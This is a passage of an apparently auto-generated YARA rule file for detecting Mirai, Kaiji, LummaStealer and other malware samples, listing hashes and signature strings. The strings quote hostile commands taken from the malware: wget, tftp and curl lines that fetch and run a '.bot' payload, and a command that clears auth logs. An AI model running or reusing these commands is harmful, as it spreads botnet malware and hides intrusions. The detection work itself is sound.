      $s4 = "Rem Fiskeyngelens grafologernes ddstrusler mishandl172. voluntaryist" fullword ascii /* score: '12.00'*/
      $s5 = "Rem Extemporisers uroacidimeter psychopannychy nonulcerous255:" fullword ascii /* score: '11.00'*/
      $s6 = "Rem Appassionatamente: babyliftens forretningsforbindelsens" fullword ascii /* score: '10.00'*/
      $s7 = "Rem Forfiner! betokening systemiser: bgebrnde" fullword ascii /* score: '10.00'*/
      $s8 = "Rem netvrket, unthrift, skdbarm postnatally!" fullword ascii /* score: '9.00'*/
      $s9 = "Divelledspaniardizehype = Log(1894290)" fullword ascii /* score: '9.00'*/
      $s10 = "Rem Anderkendt; posteringsbilledet snegle?" fullword ascii /* score: '9.00'*/
      $s11 = "Rem Sloganeer; damehats. fabulxqr," fullword ascii /* score: '9.00'*/
      $s12 = "Rem Legionrforpostens chartrings flagilate unblessed freeish:" fullword ascii /* score: '9.00'*/
      $s13 = "Urbanologists = \"Udlistningen voldtgtscenter\"" fullword ascii /* score: '9.00'*/
      $s14 = "Rem Kernelegeme190 doughy, listes," fullword ascii /* score: '9.00'*/
      $s15 = "Rem Jdekage proteosoma93: osseofibrous danseteatret! kilogrammene" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x7546 and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__007e5dc7_Mirai_signature__062aa4ec_Mirai_signature__07fa795b_Mirai_signature__082473db_Mirai_signature__08_24 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_007e5dc7.elf, Mirai(signature)_062aa4ec.elf, Mirai(signature)_07fa795b.elf, Mirai(signature)_082473db.elf, Mirai(signature)_08816e63.elf, Mirai(signature)_0b625b19.elf, Mirai(signature)_0cb12f03.elf, Mirai(signature)_0cc43412.elf, Mirai(signature)_0ccf3e87.elf, Mirai(signature)_0d9c7ca0.elf, Mirai(signature)_0e5b6487.elf, Mirai(signature)_100e0eb8.elf, Mirai(signature)_103a878e.elf, Mirai(signature)_119a75f8.elf, Mirai(signature)_1226d3ad.elf, Mirai(signature)_1349ebd3.elf, Mirai(signature)_142ac936.elf, Mirai(signature)_16b7eb2d.elf, Mirai(signature)_18112ef9.elf, Mirai(signature)_198c0ce2.elf, Mirai(signature)_19adf628.elf, Mirai(signature)_1b318c60.elf, Mirai(signature)_1b42c968.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "007e5dc71d719cca62c058bb806143c2d7627f80d204c25494229d012d535cb4"
      hash2 = "062aa4ecf94b7ab380b39e32677c80859ca4331cf00b85a8c7ab3a728da9a3cb"
      hash3 = "07fa795b94793c19b4b6e839e007894daa5809e1385353339ce92568c4183251"
      hash4 = "082473db8c5bd142e94d60312cb13ae9d01d1745f2924dc109e480e235203896"
      hash5 = "08816e635573569b4cb82c5002aaed63295a98a94f7dff72485be20db1762c44"
      hash6 = "0b625b19f44fcf0d5d279b91e1a31797e05822bcecebf5eb89f34fd54e7b943a"
      hash7 = "0cb12f03cf5aefd3d2dcfa90b1a9422f120424f2b1478b1d86ac04b90854f2f3"
      hash8 = "0cc43412e8c15933cf9bc8a449b22b0728272206ccd05a05007b0269827a8d3f"
      hash9 = "0ccf3e8740d68bc02719397bf7ce51a045219a4c24e87e19022d98116c820f2a"
      hash10 = "0d9c7ca00562af066cec1a68ef730c82b939e5893d2df0847fa13f68e58e865b"
      hash11 = "0e5b648736c6444322ab5e60c726a96f95a15c148f4243329b5a397eef0da948"
      hash12 = "100e0eb8f8e79c69ad97e36e542700bb8e1b83986de9b0a65e8e80c92a8cee7f"
      hash13 = "103a878e20f9a3924abb9e1fc4ebada0a6eb8adc74ca59035ff1e14805d20ae1"
      hash14 = "119a75f8023545d7c344b7f195a18f7a3158fedb585562bd3a5dbe1452ceafea"
      hash15 = "1226d3ada8094df0a37f50cf5e366065570906e97b1a863cdecea5d67c673f14"
      hash16 = "1349ebd3abb6414201588c32d768af7aba59dedf21fc817b872364406f8567e9"
      hash17 = "142ac936b9784e7b4ab66894312833684f55de981ef08e367130e20dc2257b43"
      hash18 = "16b7eb2d1f077ce1198a67b98bcb7caccd9511dd10bc39ea285aa2fba89be5d2"
      hash19 = "18112ef9bada413a225ebd359100f0937eda13f3bc61e7232d54b2335c5744de"
      hash20 = "198c0ce29b9d71a04dbf44baa87e916cf5ba47924f03961659472b84d9cd946a"
      hash21 = "19adf6285b1504c96400173287c0b0bdb8d0e071c3dff9706a67ea36a6e543a4"
      hash22 = "1b318c60fb6c646c4faf4860a9c7138ef69ab530f1a76e3e0f894ec3a6423e85"
      hash23 = "1b42c96817bc2176345953b1049ed126e3f82e01e52afba63562c72132bab2e4"
   strings:
      $s1 = "/bin/busybox wget %s%s -O .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s2 = "/bin/busybox tftp -g %s -P %u -r %s -l .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s3 = "curl %s%s -o .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '25.00'*/
      $s4 = "echo > /var/log/auth.log 2>/dev/null" fullword ascii /* score: '23.00'*/
      $s5 = "[%s:%d->%s:%d] USER-AGENT: %s" fullword ascii /* score: '22.50'*/
      $s6 = "[%s:%d->%s:%d] PASSWORD: %s" fullword ascii /* score: '21.50'*/
      $s7 = "sysctl -w net.ipv6.conf.all.forwarding=1 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s8 = "Coded at 3 AM on Adderall - you can tell" fullword ascii /* score: '20.00'*/
      $s9 = "[PRIORITY - %s] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s10 = "[HTTP POST/PUT] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s11 = "User-Agent: wget" fullword ascii /* score: '17.00'*/
      $s12 = "user-agent: " fullword ascii /* score: '17.00'*/
      $s13 = "sysctl -w net.ipv4.ip_forward=1 2>/dev/null" fullword ascii /* score: '17.00'*/
      $s14 = "HOST:%s|KERNEL:%s|ARCH:%s|" fullword ascii /* score: '17.00'*/
      $s15 = "User-Agent: Wget/1.12 (linux-gnu)" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00c1ea4d_Mirai_signature__01cb158d_Mirai_signature__06b6f527_Mirai_signature__0d57aae1_Mirai_signature__12_25 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00c1ea4d.elf, Mirai(signature)_01cb158d.elf, Mirai(signature)_06b6f527.elf, Mirai(signature)_0d57aae1.elf, Mirai(signature)_1266921b.elf, Mirai(signature)_13af32d8.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00c1ea4dcc447da03be41da9c55839f043a7298b99e4e91ff0d801aa445e3e0f"
      hash2 = "01cb158d1db0d9b5edb240be81c64632df83e7b41f4b899798deb5f405f3cb3d"
      hash3 = "06b6f527ab22c5b86aca78624180997ae77906de4d1c328720965467d5df6f0c"
      hash4 = "0d57aae1d5eb48a3684729255b3d8b3b9c7386204ff121c457e1b2d539b9bb3d"
      hash5 = "1266921bdf3adb8d7d4fcd77abcd66bcd269e8d6594f2b45a9280c68d29ba6c1"
      hash6 = "13af32d855bbac2af57d71348bcd28d43e64a3609b931f54bbb88d9284ddbd52"
   strings:
      $s1 = "txt.awsdns-hostedzone-info.com" fullword ascii /* score: '26.00'*/
      $s2 = "Origin: https://%s.com" fullword ascii /* score: '24.00'*/
      $s3 = "execute_xor_commands" fullword ascii /* score: '22.00'*/
      $s4 = "dkim20._domainkey.godaddy.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.microsoft.com" fullword ascii /* score: '21.00'*/
      $s6 = "any.microsoft-dns.com" fullword ascii /* score: '21.00'*/
      $s7 = "X-Akamai-Origin: https://www.example.com" fullword ascii /* score: '21.00'*/
      $s8 = "dnssec-failover.cloudflare.com" fullword ascii /* score: '21.00'*/
      $s9 = "Origin: https://www.apple.com" fullword ascii /* score: '21.00'*/
      $s10 = "Origin: https://www.instagram.com" fullword ascii /* score: '21.00'*/
      $s11 = "ipv6.google.com" fullword ascii /* score: '21.00'*/
      $s12 = "any.dns.oracle.com" fullword ascii /* score: '21.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s14 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 AtContent/95.5.5" ascii /* score: '19.00'*/
      $s15 = "any.cdn77.com" fullword ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _HijackLoader_signature__d8b31f8c03e0c76ff245ed05a15ffe6c_imphash__LummaStealer_signature__d42595b695fc008ef2c56aabd8efd68e__26 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_d8b31f8c03e0c76ff245ed05a15ffe6c(imphash).exe, LummaStealer(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aa59b9a8c2a1121e10d0bf939fc255b2ddd213fce8b1bba3c8ef84632be02aa3"
      hash2 = "16db153e6a6d2c5fa1a2899929163feebe3d29d61fb22c9cdae06cb916fc6eb4"
   strings:
      $s1 = "e failed; errno=runtime: malformed profBuf buffer - invalid sizeruntime: taggedPointerPack invalid packing: ptr=attempt to trace" ascii /* score: '25.00'*/
      $s2 = "runtime.getlasterror.abi0" fullword ascii /* score: '18.00'*/
      $s3 = "tadataruntime: pointer g already scannedmark - bad statusscanobject n == 0swept cached spanmarkBits overflowruntime: summary[run" ascii /* score: '16.00'*/
      $s4 = "ProcessGetShortPathNameWWSAEnumProtocolsWgoroutine profileAllThreadsSyscallcontainermaxprocsGC assist markingselect (no cases)sy" ascii /* score: '16.00'*/
      $s5 = "runtime.getfp" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.pinnerGetPtr" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.systemstack.abi0" fullword ascii /* score: '14.00'*/
      $s8 = "runtime.Pinner: object already unpinnedsuspendG from non-preemptible goroutineruntime: casfrom_Gscanstatus failed gp=stack growt" ascii /* score: '14.00'*/
      $s9 = "runtime.systemstack_switch.abi0" fullword ascii /* score: '14.00'*/
      $s10 = "runtime.taggedPointer.tag" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.dropm.abi0" fullword ascii /* score: '12.00'*/
      $s12 = ", not pointer != sweepgen  MB globals,  work.nproc=  work.nwait=  nStackRoots= flushedWork double unlock s.spanclass= MB) worker" ascii /* score: '11.00'*/
      $s13 = "nc.RWMutex.Lockwait for GC cycletrace proc statussync.(*Cond).Wait: missing method notetsleepg on g0bad TinySizeClassimmortal me" ascii /* score: '11.00'*/
      $s14 = "runtime.setPinned.func2" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.sehhandler.abi0" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__00b0c7f7_Mirai_signature__0f59dd6a_Mirai_signature__119c68b9_Mirai_signature__178bc26d_27 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_00b0c7f7.elf, Mirai(signature)_0f59dd6a.elf, Mirai(signature)_119c68b9.elf, Mirai(signature)_178bc26d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00b0c7f7079f032382170b8b1b18cbdd6697e546f2a9bcb9be7953f1b495dc13"
      hash2 = "0f59dd6a59ffc2423ae6226384059040cf0b1276b6c96fe913517caa9f809fc3"
      hash3 = "119c68b9ae690f0ab2f503b50b250b4a6215e108be5f6fb6df2ed4efeef11695"
      hash4 = "178bc26d6b5ecc78c26181f3eefbbfb2324c9c3375da4be55ad481273abc95d1"
   strings:
      $s1 = "SPOOFEDHASH" fullword ascii /* score: '19.50'*/
      $s2 = "dakuexecbin" fullword ascii /* score: '19.00'*/
      $s3 = "sefaexec" fullword ascii /* score: '16.00'*/
      $s4 = "deexec" fullword ascii /* score: '13.00'*/
      $s5 = "1337SoraLOADER" fullword ascii /* score: '13.00'*/
      $s6 = "SO190Ij1X" fullword ascii /* base64 encoded string ';_t"=W' */ /* score: '11.00'*/
      $s7 = "airdropmalware" fullword ascii /* score: '10.00'*/
      $s8 = "GhostWuzHere666" fullword ascii /* score: '10.00'*/
      $s9 = "trojan" fullword ascii /* PEStudio Blacklist: strings */ /* score: '10.00'*/
      $s10 = "scanspc" fullword ascii /* score: '9.00'*/
      $s11 = "scanmpsl" fullword ascii /* score: '9.00'*/
      $s12 = "scanppc" fullword ascii /* score: '9.00'*/
      $s13 = "scanmips" fullword ascii /* score: '9.00'*/
      $s14 = "mnblkjpoi" fullword ascii /* score: '8.00'*/
      $s15 = "pussyfartlmaojk" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Loki_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6_28 {
   meta:
      description = "_subset_batch - from files Loki(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6a331ed1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "28a29d7b958cb08a5e9a71078387d8727881af04a454d665cb1e966b0fcbb3ad"
      hash2 = "6a331ed125bffc7fcaf61837164bd52bf3f5788fc468f5a74f477df1b8f4f3c9"
   strings:
      $s1 = "daybreak.exe" fullword wide /* score: '22.00'*/
      $s2 = "DaybreakDX.exe" fullword wide /* score: '22.00'*/
      $s3 = "/config.dat" fullword wide /* score: '14.00'*/
      $s4 = "/addresslist.txt" fullword wide /* score: '14.00'*/
      $s5 = "getCurrentListAddress" fullword ascii /* score: '12.00'*/
      $s6 = "getAddresses" fullword ascii /* score: '12.00'*/
      $s7 = "HigurashiDaybreakConfig.FormConfig.resources" fullword ascii /* score: '10.00'*/
      $s8 = "HigurashiDaybreakConfig.FormMyConf.resources" fullword ascii /* score: '10.00'*/
      $s9 = "config.json" fullword wide /* score: '10.00'*/
      $s10 = "getVolvoice" fullword ascii /* score: '9.00'*/
      $s11 = "getVolMusic" fullword ascii /* score: '9.00'*/
      $s12 = "getShadows" fullword ascii /* score: '9.00'*/
      $s13 = "getFolder" fullword ascii /* score: '9.00'*/
      $s14 = "getVolsound" fullword ascii /* score: '9.00'*/
      $s15 = "getShading" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__78e6c917_Kaiji_signature__7cab2814_29 {
   meta:
      description = "_subset_batch - from files Kaiji(signature)_78e6c917.elf, Kaiji(signature)_7cab2814.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash2 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
   strings:
      $x1 = "tls: server sent a ServerHello extension forbidden in TLS 1.3tls: unsupported certificate: private key is %T, expected *%Tx509: " ascii /* score: '38.50'*/
      $s2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625CLIENT_HANDSHAKE_TRAFFIC_SECRETNetw" ascii /* score: '28.00'*/
      $s3 = ": new g is not Gdeadnewproc1: newg missing stacknotewakeup - double wakeup (os: process already finishedos: process already rele" ascii /* score: '23.00'*/
      $s4 = ".localhost/.walk.lod/dev/stdin/etc/32675/etc/hosts/seeintlog/setgroups122070312561035156258.8.8.8:539d27d238f49d27d439f7: parsin" ascii /* score: '22.00'*/
      $s5 = ".WithDeadline(/etc/protocols/etc/ssl/certs1907348632812595367431640625: extra text: <not Stringer>Accept-CharsetBLOCK_LENGTH_1BL" ascii /* score: '22.00'*/
      $s6 = "ol tablemalformed MIME header line: mheap.freeSpanLocked - span missing stack in shrinkstackmspan.sweep: m is not lockednewproc1" ascii /* score: '22.00'*/
      $s7 = " MB,  and  cnt= got= max= ms,  ptr  tab= top=%s %q%s-%s, fp:--add/.mod/d');/proc/stat/tmp/15625326753267678125:***@:path<nil>Adl" ascii /* score: '19.50'*/
      $s8 = "ed with invalid signature algorithm -- obsoleteuconn.Extensions contains %v separate SupportedVersions extensionswebsocket: inte" ascii /* score: '18.00'*/
      $s9 = " is unavailable,M3.2.0,M11.1.0/etc/mdns.allow0601021504Z0700476837158203125: cannot parse : no frame (sp=<invalid Value>ASCII_He" ascii /* score: '18.00'*/
      $s10 = "0123456789abcdef2384185791015625: value of type Already ReportedBLOCK_TYPE_TREESContent-EncodingContent-LanguageContent-Length: " ascii /* score: '17.00'*/
      $s11 = ", not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat0123456789ABCDEF" ascii /* score: '17.00'*/
      $s12 = "invalid function symbol tableinvalid length of trace eventio: read/write on closed pipemachine is not on the networkmismatched l" ascii /* score: '16.00'*/
      $s13 = "nection losthttp: idle connection timeoutinteger not minimally-encodedinternal error: took too muchinvalid P256 element encoding" ascii /* score: '15.00'*/
      $s14 = "ilureprofMemActiveprofMemFutureread header: runtime: seq=runtime: val=srmount errorstop signal: timer expiredtimer_settimetraceS" ascii /* score: '15.00'*/
      $s15 = "runtime.sysMunmap" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 16000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0dd239f6_Mirai_signature__11e253d3_Mirai_signature__1368463f_Mirai_signature__13769e69_Mirai_signature__1b_30 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0dd239f6.elf, Mirai(signature)_11e253d3.elf, Mirai(signature)_1368463f.elf, Mirai(signature)_13769e69.elf, Mirai(signature)_1bdaf68b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0dd239f64d3b1661218bcf4886781dd8f8ca634ba110c9dab7adaa03434e7a08"
      hash2 = "11e253d3451b8d1a1ccf47ec018e8768faaf090118e46a24064807f24abc1546"
      hash3 = "1368463ff5e905ed9ce63ed978d1ff6a03ff1ac373ac1ddca21dec9f8b3330ac"
      hash4 = "13769e69c4232fd780afa01e93bfe36a4fba02120ff6403def9718c638441b88"
      hash5 = "1bdaf68bc822be942542b352bcb9b575dbce72161da6042b7d14444a35f3cdc7"
   strings:
      $s1 = "%s: '%s' is not an ELF executable for ARCompact" fullword ascii /* score: '20.50'*/
      $s2 = "%s():%i: Circular dependency, skipping '%s'," fullword ascii /* score: '17.50'*/
      $s3 = "44444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444" ascii /* score: '17.00'*/ /* hex encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD' */
      $s4 = "%s:%i: relocation processing: %s" fullword ascii /* score: '16.50'*/
      $s5 = "%s():%i: %s: usage count: %d" fullword ascii /* score: '14.50'*/
      $s6 = "%s():%i: Lib: %s already opened" fullword ascii /* score: '12.50'*/
      $s7 = "%s():%i: running dtors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s8 = "%s():%i: __address: %p  __info: %p" fullword ascii /* score: '12.50'*/
      $s9 = "%s():%i: running ctors for library %s at '%p'" fullword ascii /* score: '12.50'*/
      $s10 = "m|||||||" fullword ascii /* reversed goodware string '|||||||m' */ /* score: '11.00'*/
      $s11 = "////////////," fullword ascii /* reversed goodware string ',////////////' */ /* score: '11.00'*/
      $s12 = "&|||||" fullword ascii /* reversed goodware string '|||||&' */ /* score: '11.00'*/
      $s13 = "searching RUNPATH='%s'" fullword ascii /* score: '10.00'*/
      $s14 = "%s():%i: Looking for needed libraries" fullword ascii /* score: '9.50'*/
      $s15 = "%s():%i: Trying to dlopen '%s', RTLD_GLOBAL:%d RTLD_NOW:%d" fullword ascii /* score: '9.50'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Kaiji_signature__af3c1821_Kaiji_signature__bd7a37a8_Ka_31 {
   meta:
      description = "_subset_batch - from files Kaiji(signature).elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash2 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash3 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash4 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash5 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash6 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash7 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash8 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii /* score: '40.00'*/
      $s2 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625CLIENT_HANDSHAKE_TRAFFIC_SECRETNetw" ascii /* score: '30.00'*/
      $s3 = "morebuf={pc:accept-encodingaccept-languageadvertise errorasyncpreemptoffbad certificatebad close code bad system callbad trailer" ascii /* score: '30.00'*/
      $s4 = " != sweepgen  (going away) MB globals,  MB) workers= called from  failed with  flushedWork  idlethreads= in host name is nil, no" ascii /* score: '27.00'*/
      $s5 = "/dev/urandom/usr/bin/dir/usr/bin/top100-continue127.0.0.1:53152587890625762939453125AddAllowlistBidi_ControlCONTINUATIONContent-" ascii /* score: '26.00'*/
      $s6 = "Udp  netGo =  MB goal,  flushGen  gfreecnt= heapGoal= pages at  ptrSize=  returned  runqsize= runqueue= s.base()= spinning= stop" ascii /* score: '25.00'*/
      $s7 = ".localhost/.walk.lod/dev/stdin/etc/32675/etc/hosts/seeintlog/setgroups122070312561035156258.8.8.8:539d27d238f49d27d439f7: parsin" ascii /* score: '25.00'*/
      $s8 = "eep: m is not lockednewproc1: new g is not Gdeadnewproc1: newg missing stacknotewakeup - double wakeup (os: process already fini" ascii /* score: '23.00'*/
      $s9 = "*http2.Transport, not a function.WithValue(type /boot/System.mod/etc/rc.d/init.d/etc/resolv.conf/lib/system-mark/usr/bin/netstat" ascii /* score: '23.00'*/
      $s10 = "ngRIPEMD-160RST_STREAMSHA256-RSASHA384-RSASHA512-RSASaurashtraSet-CookieStratProxySystem.modUser-Agentatomicand8complex128connec" ascii /* score: '22.00'*/
      $s11 = "wait= stream=%d sweepgen  sweepgen= targetpc= throwing= until pc=%!(NOVERB)%!Weekday((BADINDEX), bound = , limit = ,errno=0}" fullword ascii /* score: '22.00'*/
      $s12 = " name %qinvalid runtime symbol tablemalformed MIME header line: mheap.freeSpanLocked - span missing stack in shrinkstackmspan.sw" ascii /* score: '20.00'*/
      $s13 = "rrorcan't happencas64 failedchan receivechild exitedclose notifycontent-typecontext.TODOdumping heapend tracegc" fullword ascii /* score: '20.00'*/
      $s14 = ".WithDeadline(/etc/localtime/etc/protocols/etc/ssl/certs1907348632812595367431640625: extra text: <not Stringer>Accept-CharsetBL" ascii /* score: '19.00'*/
      $s15 = "used with invalid signature algorithm -- obsoleteuconn.Extensions contains %v separate SupportedVersions extensionswebsocket: in" ascii /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__0052d359_Mirai_signature__01b80109_Mirai_signature__03d6e399_Mirai_signature__0c86e336_Mirai_signature__0f_32 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_0052d359.elf, Mirai(signature)_01b80109.elf, Mirai(signature)_03d6e399.elf, Mirai(signature)_0c86e336.elf, Mirai(signature)_0f0e00a8.elf, Mirai(signature)_16a75c55.elf, Mirai(signature)_188310f0.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0052d359df89257e8b0975db343e1285554b28ef45b8df7eaf395e02b00908f5"
      hash2 = "01b801099ef5f07ed95f7b8d9a88adbeefd3e28eef4b52f5d0a63f802ac4f04c"
      hash3 = "03d6e399076565c78f2af4046d1d1010627d18e729118962e8704672c608b353"
      hash4 = "0c86e33653c38251d28290591be0026d56737b41713f8b77c3ea2a2fb98034ee"
      hash5 = "0f0e00a84f02ed07208eef6181ff76b1c37a28248fa9f83a176477414168a209"
      hash6 = "16a75c55b04c87b7d82aa8f8253fbdb7e45a49dfebb74852f2fb8f42a7548f42"
      hash7 = "188310f01ef7006928c9ed564216febc84749050ff8de44d6f4f08db84a265b2"
   strings:
      $s1 = "_Unwind_decode_target2" fullword ascii /* score: '16.00'*/
      $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" fullword ascii /* score: '14.00'*/
      $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" fullword ascii /* score: '14.00'*/
      $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" fullword ascii /* score: '11.00'*/
      $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" fullword ascii /* score: '11.00'*/
      $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm" fullword ascii /* score: '11.00'*/
      $s7 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" fullword ascii /* score: '11.00'*/
      $s8 = "_Unwind_EHT_Header" fullword ascii /* score: '9.00'*/
      $s9 = "attack_get_opt_str" fullword ascii /* score: '9.00'*/
      $s10 = "fnoffset" fullword ascii /* score: '8.00'*/
      $s11 = "bitpattern" fullword ascii /* score: '8.00'*/
      $s12 = "fnstart" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _HeliBot_signature__Mirai_signature__0052d359_Mirai_signature__00c1ea4d_Mirai_signature__01b80109_Mirai_signature__01cb158d__33 {
   meta:
      description = "_subset_batch - from files HeliBot(signature).elf, Mirai(signature)_0052d359.elf, Mirai(signature)_00c1ea4d.elf, Mirai(signature)_01b80109.elf, Mirai(signature)_01cb158d.elf, Mirai(signature)_03d6e399.elf, Mirai(signature)_0436ef41.elf, Mirai(signature)_06b6f527.elf, Mirai(signature)_0c86e336.elf, Mirai(signature)_0d57aae1.elf, Mirai(signature)_0f0e00a8.elf, Mirai(signature)_11bcd56a.elf, Mirai(signature)_1266921b.elf, Mirai(signature)_13af32d8.elf, Mirai(signature)_16a75c55.elf, Mirai(signature)_180d9d0e.elf, Mirai(signature)_188310f0.elf, Mirai(signature)_19e62b77.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fb21b1f4574a375639617cc47af121229e375c251bcc70b0358afaa1d1c66e49"
      hash2 = "0052d359df89257e8b0975db343e1285554b28ef45b8df7eaf395e02b00908f5"
      hash3 = "00c1ea4dcc447da03be41da9c55839f043a7298b99e4e91ff0d801aa445e3e0f"
      hash4 = "01b801099ef5f07ed95f7b8d9a88adbeefd3e28eef4b52f5d0a63f802ac4f04c"
      hash5 = "01cb158d1db0d9b5edb240be81c64632df83e7b41f4b899798deb5f405f3cb3d"
      hash6 = "03d6e399076565c78f2af4046d1d1010627d18e729118962e8704672c608b353"
      hash7 = "0436ef4186a89f5d0f6ac3dcf057fee1f8c43c5dcd1b87ff68f66a5d72856136"
      hash8 = "06b6f527ab22c5b86aca78624180997ae77906de4d1c328720965467d5df6f0c"
      hash9 = "0c86e33653c38251d28290591be0026d56737b41713f8b77c3ea2a2fb98034ee"
      hash10 = "0d57aae1d5eb48a3684729255b3d8b3b9c7386204ff121c457e1b2d539b9bb3d"
      hash11 = "0f0e00a84f02ed07208eef6181ff76b1c37a28248fa9f83a176477414168a209"
      hash12 = "11bcd56afbf36da794f6dea6e502005528c17659a4a36cbaf32c526ce1ed5234"
      hash13 = "1266921bdf3adb8d7d4fcd77abcd66bcd269e8d6594f2b45a9280c68d29ba6c1"
      hash14 = "13af32d855bbac2af57d71348bcd28d43e64a3609b931f54bbb88d9284ddbd52"
      hash15 = "16a75c55b04c87b7d82aa8f8253fbdb7e45a49dfebb74852f2fb8f42a7548f42"
      hash16 = "180d9d0e774ec7b777d80113096ab47ef630308c626bf99f1c03cf80e1ccef24"
